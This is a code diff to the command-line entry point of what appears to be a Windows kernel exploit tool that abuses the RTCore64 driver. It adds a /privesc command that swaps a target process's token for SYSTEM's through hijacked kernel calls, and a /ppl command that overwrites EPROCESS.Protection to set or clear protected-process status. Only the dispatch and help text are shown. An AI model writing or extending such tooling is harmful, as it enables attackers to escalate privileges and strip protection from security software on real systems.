@@ -134,9 +134,18 @@ int main(int argc, char** argv) {
 
     if (argc < 2 || strcmp(argv[1] + 1, "help") == 0 ) {
         printf("Usage: %s\n"
-            " /codeexecution processPID(In Decimal) - execute kernelmode routine\n"
-            " /installDriver - Install the MSI driver\n"
-            " /uninstallDriver - Uninstall the MSI driver\n"
+            " /codeexecution <PID>      - hijack NtSetQuotaInformationFile ->\n"
+            "                             PsLookupProcessByProcessId and print the\n"
+            "                             target process's image name (original PoC).\n"
+            " /privesc       <PID>      - chain two hijacks: PsLookupProcessByProcessId\n"
+            "                             (for target PID and PID 4/SYSTEM) followed by\n"
+            "                             memcpy, swapping the target's primary token to\n"
+            "                             SYSTEM's from kernel mode.\n"
+            " /ppl           <PID> <0|1>- chain two hijacks: PsLookupProcessByProcessId,\n"
+            "                             then memcpy of a single byte over\n"
+            "                             EPROCESS.Protection. 1 = PPL/WinTcb, 0 = clear.\n"
+            " /installDriver            - install the RTCore64 driver.\n"
+            " /uninstallDriver          - uninstall the RTCore64 driver.\n"
             , argv[0]);
         return 0;
     }
@@ -171,10 +180,17 @@ int main(int argc, char** argv) {
     kernelHelper helper = kernelHelper(&m);
 
     if (strcmp(argv[1] + 1, "codeexecution") == 0 && argc == 3) {
-		DWORD64 pid = atoi(argv[2]);
-		//Execute Kernel Code
+		DWORD32 pid = (DWORD32)atoi(argv[2]);
 		helper.codeExecution(pid);
-
+    }
+    else if (strcmp(argv[1] + 1, "privesc") == 0 && argc == 3) {
+		DWORD32 pid = (DWORD32)atoi(argv[2]);
+		helper.privesc(pid);
+    }
+    else if (strcmp(argv[1] + 1, "ppl") == 0 && argc == 4) {
+		DWORD32 pid = (DWORD32)atoi(argv[2]);
+		BOOL makeProtected = (atoi(argv[3]) != 0);
+		helper.pplToggle(pid, makeProtected);
     }
     else {
         wprintf(L"Error: Check the help\n");
